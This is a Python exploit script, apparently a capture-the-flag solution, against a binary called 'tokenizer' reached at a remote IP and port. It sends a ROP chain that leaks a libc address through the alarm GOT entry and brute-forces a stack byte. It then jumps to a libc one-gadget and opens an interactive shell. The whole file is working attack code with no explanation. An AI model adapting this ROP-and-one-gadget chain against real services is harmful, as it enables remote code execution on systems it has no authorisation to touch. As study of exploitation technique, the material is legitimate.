from ptrlib import *

libc = ELF("./libc-2.27.so")
elf = ELF("./tokenizer")
libc_one_gadget = 0x10a38c
addr_main = 0x40133c
addr_st_cout = 0x404020
addr_cout = 0x401080
rop_pop_rsi_r15 = 0x00401499
rop_pop_rdi = 0x0040149b

# Stage 1: leak libc address
base_payload = b''
base_payload += p64(rop_pop_rsi_r15)
base_payload += p64(elf.got("alarm"))
base_payload += p64(0xdeadbeef)
base_payload += p64(rop_pop_rdi)
base_payload += p64(addr_st_cout)
base_payload += p64(addr_cout)
base_payload += p64(addr_main)
payload = base_payload * ((0x400 - 8) // len(base_payload))
payload = payload[16:0x400 - 0x80]
payload += b'\xaa' * (0x400 - len(payload)) # padding
payload = payload.replace(b'\x00', b'\xaa')

while True:
    #sock = Process("./tokenizer")
    sock = Socket("165.22.57.24", 32000)
    sock.recvuntil("characters): ")
    sock.sendline(payload)
    sock.recvuntil(": ")
    addr_stack = sock.recvline()[0x400:]
    logger.info("addr stack = " + hex(u64(addr_stack)))
    if addr_stack == b'' or addr_stack[0] == 0x10:
        logger.warn("Bad luck!")
        sock.close()
        continue
    target = bytes([addr_stack[0]]) + b'\xaa'
    #if target in payload or (0x400 - addr_stack[0]) % len(base_payload) != 0:
    if target in payload or addr_stack[0] != 0xf0:
        logger.warn("Bad luck!")
        sock.close()
        continue
    break

sock.recvuntil(": ")
sock.sendline(target)

# libc leak
sock.recvuntil(addr_stack[-2:] + b"\n")
recv = sock.recvuntil("Welcome")
libc_base = u64(recv.rstrip(b"Welcome")) - libc.symbol("alarm")
logger.info("libc base = " + hex(libc_base))

# Stage 2: One gadget
payload = p64(libc_base + libc_one_gadget) * (0x400 // 8)
payload = payload.replace(b'\x00', b'\xaa')
sock.recvuntil("characters): ")
sock.sendline(payload)
sock.recvuntil(": ")
target = b'\x38\xaa'
sock.recvuntil(": ")
sock.sendline(target)

sock.interactive()
